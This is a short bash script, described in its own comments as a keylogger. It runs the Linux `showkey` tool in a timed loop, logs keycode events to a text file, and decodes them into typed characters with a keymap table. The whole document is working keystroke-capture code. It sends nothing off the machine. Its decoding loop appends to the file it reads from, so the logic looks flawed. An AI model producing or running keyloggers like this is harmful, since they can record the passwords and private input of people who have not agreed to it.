#!/usr/bin/bash
# showkey command keeps track of the keypress. need sudo to operate 
# S flag of sudo reads password from stdinput rather than terminal device
# pipeline : collect the stdout of the last command and send it to next command as stdint
START=$(date +%-M)
echo $START
KEYMAP=(
'keycode  1:<Escape>'
"keycode  2:1"
"keycode  3:2"
"keycode  4:3"
"keycode  5:4"
"keycode  6:5"
"keycode  7:6"
"keycode  8:7"
"keycode  9:8"
"keycode  10:9"
"keycode  11:0"
'keycode  14:<BackSpace>'
'keycode  15:<Tab>'
'keycode  16:q'
'keycode  17:w'
'keycode  18:e'
'keycode  19:r'
'keycode  20:t'
'keycode  21:y'
'keycode  22:u'
'keycode  23:i'
'keycode  24:o'
'keycode  25:p'
'keycode  26:['
'keycode  27:]'
'keycode  28:<Return>'
'keycode  29:<left ctrl>'
'keycode  30:a'
'keycode  31:s'
'keycode  32:d'
'keycode  33:f'
'keycode  34:g'
'keycode  35:h'
'keycode  36:j'
'keycode  37:k'
'keycode  38:l'
'keycode  39:;'
'keycode  40:<single quote>'
'keycode  43:\'
'keycode  44:z'
'keycode  45:x'
'keycode  46:c'
'keycode  47:v'
'keycode  48:b'
'keycode  49:n'
'keycode  50:m'
'keycode  51:,'
'keycode  52:.'
'keycode  53:/'
'keycode  54:<right shift>|<possible left shift end>'
'keycode  55:KP_Multiply'
'keycode  56:<left Alt>'
'keycode  57:<space>'
'keycode  58:<Caps_Lock>'
'keycode  59:F1'
'keycode  60:F2'
'keycode  61:F3'
'keycode  62:F4'
'keycode  63:F5'
'keycode  64:F6'
'keycode  65:F7'
'keycode  66:F8'
'keycode  67:F9'
'keycode  68:F10'
'keycode  69:Num_Lock'
'keycode  87:F11'
'keycode  88:F12'
'keycode  98:KP_Divide'
'keycode  100:<right alt>'
'keycode  102:Home'
'keycode  103:<Up>'
'keycode  104:Page_Up'
'keycode  105:<Left>'
'keycode  106:<Right>'
'keycode  107:<End>'
'keycode  108:<Down>'
'keycode  109:Page_Down'
'keycode  110:Insert'
'keycode  111:Delete'
'keycode  42:<Shift>')

showkey > testing_output.txt
difference=$(( START - $(date +%-M) ))
# set a time frame for keylogger. dynamic exit for the program if time is up
#echo 'before getting in'

# until 1
until (( ${difference#-} >= 1 && ${difference#-} < 59 ))
do

showkey >> testing_output.txt
difference=$(( START - $(date +%-M) ))
done # end until 1
echo $(date +%-M)

last_line_key='nothing'
# read every lines from the txt file
# while 1
while IFS=  read -r line ; do

line=${line//[[:blank:]]/} # remove all whitespace
if [[ $line == *"keycode42press"* && \
$last_line_key != 'keycode42press' ]]; then
echo '<shift> start' >> "./testing_output.txt"
fi 

if [[ $line == *"keycode54press"* && \
$last_line_key != 'keycode54press' ]]; then
echo 'possible <shift> start' >> "./testing_output.txt"
fi
 
last_line_key=$line
line_key=${line%press} # remove 'press' at the end of the word 
line_key=${line_key%release} # remove 'release' at the end
#echo $line_key
findd='Not find a match. Unrelated line' 

# if 1
if [[ $line == *"release"* ]]; then
# for 1
for i in "${!KEYMAP[@]}" ; do # for each line, check for every keystrokes
key=${KEYMAP[i]%%:*} # get the key for every element in keymap
key=${key//[[:blank:]]/} # remove the space for the key
#echo $key
lengthofkey=${#key} # get the length of the key
value=${KEYMAP[i]##*:} # get the value of the element
#echo "value is $value"
#echo ${line:0:$lengthofkey}

# if 2
if [[ ${line_key} == ${key} ]]; then
echo "$value" >> "./testing_output.txt"
findd='Find a line'
fi # end if 2

done # end for 1
fi # end if 1

#echo $findd
done < "./testing_output.txt" # end while 1
